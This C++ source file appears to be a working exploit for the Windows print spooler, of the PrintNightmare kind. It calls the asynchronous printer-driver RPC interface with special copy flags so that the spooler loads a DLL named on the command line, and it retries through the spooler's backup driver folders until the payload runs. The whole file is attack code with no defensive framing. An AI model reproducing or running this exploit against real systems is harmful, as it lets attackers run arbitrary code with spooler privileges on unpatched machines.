#include <iostream>
#include<Windows.h>
#include"ms-par.h"
#pragma comment(lib,"rpcrt4.lib")
#pragma comment(lib,"winspool.lib")
#pragma comment(lib,"user32.lib")
wchar_t PayloadDllPath[MAX_PATH] = { 0 };
wchar_t PayloadBakPath[MAX_PATH] = { 0 };
wchar_t PayloadName[0x100] = { 0 };
wchar_t PrinterDriverPath[MAX_PATH] = { 0 };
extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}
extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}
BOOL IsExists(const wchar_t* DriverFile) {
	WIN32_FIND_DATA FindFileData;
	HANDLE Handle = FindFirstFileW(DriverFile, &FindFileData);
	BOOL Found = Handle != INVALID_HANDLE_VALUE;
	if (Found) {
		FindClose(Handle);
	}
	return Found;
}
BOOL EnumPrinterDriverPath() {
	DWORD dwNeeded;
	LPBYTE lpDriverInfo;
	DWORD dwReturned;
	DRIVER_INFO_2* pInfo;
	DWORD i;
	EnumPrinterDriversW(NULL, NULL, 2, NULL, 0, &dwNeeded, &dwReturned);
	lpDriverInfo = (LPBYTE)LocalAlloc(LPTR, dwNeeded);
	if (lpDriverInfo == NULL) {
		return 0;
	}
	EnumPrinterDriversW(NULL, NULL, 2, lpDriverInfo, dwNeeded, &dwNeeded, &dwReturned);
	pInfo = (DRIVER_INFO_2*)lpDriverInfo;
	for (i = 0; i < dwReturned; i++) {
		if (wcsstr(pInfo->pDriverPath, L"ntprint.inf_amd64")) {
			wcscpy(PrinterDriverPath,pInfo->pDriverPath);
			if (IsExists(PrinterDriverPath)) {
				LocalFree(lpDriverInfo);
				return TRUE;
			}
		}
		pInfo++;
	}
	LocalFree(lpDriverInfo);
	return FALSE;
}
int wmain(int argc, wchar_t* argv[])
{
	if (argc != 2)
	{
		wprintf(L"[-] %s payloadpath\n", argv[0]);
		return 0;
	}
	RPC_WSTR String;
	RPC_BINDING_HANDLE Binding;
	RPC_SECURITY_QOS SecurityQOS;
	wsprintf(PayloadDllPath, L"%s", argv[1]);
	wprintf(L"[+] PayloadDllPath:%s\n", PayloadDllPath);
	wsprintf(PayloadName, L"%s", wcsrchr(argv[1], '\\') + 1);
	wprintf(L"[+] PayloadName:%s\n", PayloadName);
	SecurityQOS.Version = 1;
	SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_DELEGATE;
	SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;
	SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;

	RPC_STATUS status = RpcStringBindingComposeW(
		(RPC_WSTR)L"9940CA8E-512F-4C58-88A9-61098D6896BD",
		(RPC_WSTR)L"ncacn_ip_tcp",
		0,
		NULL,
		0,
		&String);
	status = RpcBindingFromStringBindingW(String, &Binding);
	if (status == 0)
	{
		wprintf(L"[+] RpcBindingFromStringBindingW ok!\n");
	}
	RpcStringFreeW(&String);
	status = RpcBindingSetAuthInfoExW(Binding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, NULL, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
	if (status == 0)
	{
		wprintf(L"[+] RpcBindingSetAuthInfoExW ok!\n");
	}
	DRIVER_INFO_2 info;
	info.cVersion = 3;
	info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\ntdll.dll";
	info.pDataFile = PayloadDllPath;
	info.pEnvironment = (LPWSTR)L"Windows x64";
	info.pName = (LPWSTR)L"123";
	if (EnumPrinterDriverPath())
	{
		info.pDriverPath = PrinterDriverPath;
		wprintf(L"[+] DriverPath:%s\n", info.pDriverPath);
	}
	else
	{
		wprintf(L"[+] EnumPrinterDriverPath Error!\n");
		return 0;
	}

	DRIVER_CONTAINER container;
	container.Level = 2;
	container.DriverInfo.Level2 = new DRIVER_INFO_2();
	container.DriverInfo.Level2->cVersion = 3;
	container.DriverInfo.Level2->pConfigFile = info.pConfigFile;
	container.DriverInfo.Level2->pDataFile = info.pDataFile;
	container.DriverInfo.Level2->pDriverPath = info.pDriverPath;
	container.DriverInfo.Level2->pEnvironment = info.pEnvironment;
	container.DriverInfo.Level2->pName = info.pName;
	RpcTryExcept
	{
	DWORD ret = RpcAsyncAddPrinterDriver(Binding,NULL,&container,	APD_COPY_ALL_FILES | 0x10 | 0x8000);
	wprintf(L"[+] RpcAsyncAddPrinterDriver result:%d\n", ret);
	wprintf(L"[+] Try to load Payload\n");
	for (int i = 1; i <4; i++)
	{
		wsprintf(PayloadBakPath, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\%d\\%s",i,PayloadName);
		container.DriverInfo.Level2->pConfigFile = PayloadBakPath;
		ret = RpcAsyncAddPrinterDriver(Binding,
			NULL,
			&container,
			APD_COPY_ALL_FILES | 0x10 | 0x8000
		);
		if (ret == 0)
		{
			wprintf(L"[*] Successful!!!\n");
			return 0;
		}
	}
	}
	RpcExcept(1)
	{
		status = RpcExceptionCode();
		wprintf(L"RPC ERROR CODE %d\n", status);
	}
	RpcEndExcept
	return 0;
}

